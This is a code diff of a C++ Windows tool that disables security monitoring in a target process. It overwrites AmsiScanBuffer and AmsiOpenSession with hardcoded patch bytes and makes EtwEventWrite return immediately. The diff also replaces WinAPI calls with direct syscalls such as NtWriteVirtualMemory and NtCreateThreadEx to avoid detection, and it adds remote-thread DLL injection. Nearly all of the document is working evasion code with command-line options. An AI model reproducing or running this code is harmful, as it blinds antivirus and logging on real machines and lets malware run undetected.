@@ -2,75 +2,79 @@
 #include <psapi.h>
 #include <iostream>
 #include <tchar.h>
+#include "syscalls_mem.h"
 
-bool is64bit() {
-    if (sizeof(void*) == 4)
-        return false;
-    return true;
-}
 
 void patchAMSI(OUT HANDLE& hProc) {
 
-    HMODULE amsiDllHandle = LoadLibraryA("amsi.dll");
-    //FARPROC amsiAddr = GetProcAddress(amsiDllHandle, "AmsiScanBuffer");
-    void* dummyAddr = GetProcAddress(amsiDllHandle, "DllRegisterServer");
-    char* amsiAddr = (char*)dummyAddr + 6896;
+    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
 
-    //char amsiPatch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    //xor eax, eax
-    //add    eax, 0x7dfdfe4e
-    //add    eax, 0x02090209
-    //ret
     char amsiPatch[] = { 0x31, 0xC0, 0x05, 0x4E, 0xFE, 0xFD, 0x7D, 0x05, 0x09, 0x02, 0x09, 0x02, 0xC3 };
  
+    DWORD lpflOldProtect = 0;
+    unsigned __int64 memPage = 0x1000;
+    void* amsiAddr_bk = amsiAddr;
 
-    if (WriteProcessMemory(hProc, (void*)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr)) {
-        std::cout << "[+] Patched amsi!\n";
-    }
-    else {
-        std::cout << "[-] Failed to patch amsi\n";
-    }
+    
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
+    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+    std::cout << "[+] Patched amsi!\n";
+}
+
+void patchAMSIOpenSession(OUT HANDLE& hProc) {
+
+    void* amsiAddr = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiOpenSession");
+
+    char amsiPatch[] = { 0x48, 0x31, 0xC0 };
+
+    DWORD lpflOldProtect = 0;
+    unsigned __int64 memPage = 0x1000;
+    void* amsiAddr_bk = amsiAddr;
+
+
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
+    NtWriteVirtualMemory(hProc, (LPVOID)amsiAddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
+    NtProtectVirtualMemory(hProc, (PVOID*)&amsiAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+    std::cout << "[+] Patched amsi open session!\n";
 }
 
 void patchETW(OUT HANDLE& hProc) {
 
-    HMODULE ntDllHandle = LoadLibraryA("ntdll.dll");
-    //FARPROC etwAddr = GetProcAddress(ntDllHandle, "EtwEventWrite");
-    void* dummyAddr = GetProcAddress(ntDllHandle, "RtlSetLastWin32Error");
-    char* etwAddr = (char*)dummyAddr - 5584;
-
+    void* etwAddr = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "EtwEventWrite");
+    
     char etwPatch[4];
-    if (is64bit()) {
-        char d[] = { 0xC3 };
-        memcpy(etwPatch, d, sizeof(d));
-    }
-    else {
-        char d[] = { 0xC2, 0x14, 0x00 };
-        memcpy(etwPatch, d, sizeof(d));
-    }
-
-
-    if (WriteProcessMemory(hProc, etwAddr, (PVOID)etwPatch, (SIZE_T)1, (SIZE_T*)nullptr)) {
-        std::cout << "[+] Patched etw!\n";
-    }
-    else {
-        std::cout << "[-] Failed to patch etw\n";
-    }
+    char d[] = { 0xC3 };
+    memcpy(etwPatch, d, sizeof(d));
+    
+    DWORD lpflOldProtect = 0;
+    unsigned __int64 memPage = 0x1000;
+    void* etwAddr_bk = etwAddr;
+    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
+    NtWriteVirtualMemory(hProc, (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (SIZE_T*)nullptr);
+    NtProtectVirtualMemory(hProc, (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
+    std::cout << "[+] Patched etw!\n";
 
 }
 
 void loadAMSIdll(OUT HANDLE& hProc) {
 
     PVOID buf;
+    const char* dllPath;
+    dllPath = "C:\\Windows\\System32\\amsi.dll";
+   
+    
+    LPVOID lpAllocationStart = nullptr;
+    HANDLE dllThread = NULL;
+    SIZE_T szAllocationSize = strlen(dllPath);
+    LPVOID lpStartAddress = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
 
-    wchar_t dllPath[] = L"C:\\Windows\\System32\\amsi.dll";
-
-    buf = VirtualAllocEx(hProc, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
-    WriteProcessMemory(hProc, buf, (LPVOID)dllPath, sizeof dllPath, NULL);
-    PTHREAD_START_ROUTINE loadLibAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
-    HANDLE dllThread = CreateRemoteThread(hProc, NULL, 0, loadLibAddr, buf, 0, NULL);
+    NtAllocateVirtualMemory(hProc, &lpAllocationStart, 0, (PSIZE_T)&szAllocationSize, MEM_COMMIT, PAGE_READWRITE);
+    NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), nullptr);
+    NtCreateThreadEx(&dllThread, GENERIC_EXECUTE, NULL, hProc, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, nullptr);
+    
     if (dllThread == NULL) {
-        std::cout << "[-] Failed to load amsi.dll";
+        std::cout << "[-] Failed to load amsi.dll\n";
     }
     else {
         WaitForSingleObject(dllThread, 1000);
@@ -89,12 +93,14 @@ void printHelp() {
         "\tthe program that will be executed and patched\n"
         "  --pid [pid]"
         "\tthe process ID that will be patched\n"
-        "  -a"
+        "  -na"
         "\t\tto NOT patch AMSI\n"
-        "  -e"
+        "  -ne"
         "\t\tto NOT patch ETW\n"
+        "  -ao"
+        "\t\tto patch AmsiOpenSession instead of AmsiScanBuffer\n"
         "  -l"
-        "\t\tto NOT load amsi.dll\n"
+        "\t\tto load amsi.dll\n"
         << std::endl;
     return;
 }
@@ -108,8 +114,9 @@ int main(int argc, char* argv[])
 
     char* mode;
     bool isPatchAMSI = true;
+    bool isPatchAMSIOpenSession = false;
     bool isPatchETW = true;
-    bool isLoadDll = true;
+    bool isLoadDll = false;
     LPSTR cmd;
     HANDLE hProc = NULL;
 
@@ -144,14 +151,18 @@ int main(int argc, char* argv[])
             );
            
         }
-        else if(arg == "-a"){
+        else if(arg == "-na"){
             isPatchAMSI = false;
         }
-        else if (arg == "-e") {
+        else if (arg == "-ne") {
             isPatchETW = false;
         }
+        else if (arg == "-ao") {
+            isPatchAMSI = false;
+            isPatchAMSIOpenSession = true;
+        }
         else if (arg == "-l") {
-            isLoadDll = false;
+            isLoadDll = true;
         }
 
     }
@@ -170,6 +181,10 @@ int main(int argc, char* argv[])
 
     if (isPatchAMSI)
         patchAMSI(hProc);
+
+    if (isPatchAMSIOpenSession)
+        patchAMSIOpenSession(hProc);
+
 
     CloseHandle(hProc);
     return 0;
